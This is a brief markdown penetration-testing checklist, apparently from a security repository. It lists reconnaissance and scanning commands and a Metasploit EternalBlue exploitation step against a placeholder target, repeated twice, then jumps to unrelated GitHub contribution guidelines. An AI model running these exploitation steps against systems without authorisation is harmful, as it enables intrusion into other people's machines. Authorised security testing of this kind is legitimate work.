## Penetration Testing Protocol

### 1. Reconnaissance
```bash
whois [domain]
dnsenum [domain]
nmap -sV -O -T4 [target]
```
### 2. Vulnerability Scanning 
# Web apps
zap-cli quick-scan -s all http://[target]

# Network services
nmap --script vuln [target]
### 3. Exploitation 
# Metasploit example
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [target]
run
# Metasploit example
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [target]
run

### 4. Reporting
Document all findings in templates/incident_response.csv

Classify severity (Critical/High/Medium/Low)

Include remediation steps

---

### Phase 5: GitHub Workflow & Maintenance - Detailed Steps

#### 1. Collaboration Setup
**File:** `CONTRIBUTING.md`

```markdown
# Contribution Guidelines

## Workflow
1. Create issue describing proposed changes
2. Fork repository
3. Create feature branch: `git checkout -b feat/[feature-name]`
4. Commit changes: `git commit -m "feat: [description]"`
5. Push to fork: `git push origin feat/[feature-name]`
6. Open pull request

## Standards
- Use Markdown formatting
- Validate scripts with ShellCheck/PSScriptAnalyzer
- Update version in `VERSION` file
- Keep commits atomic
```
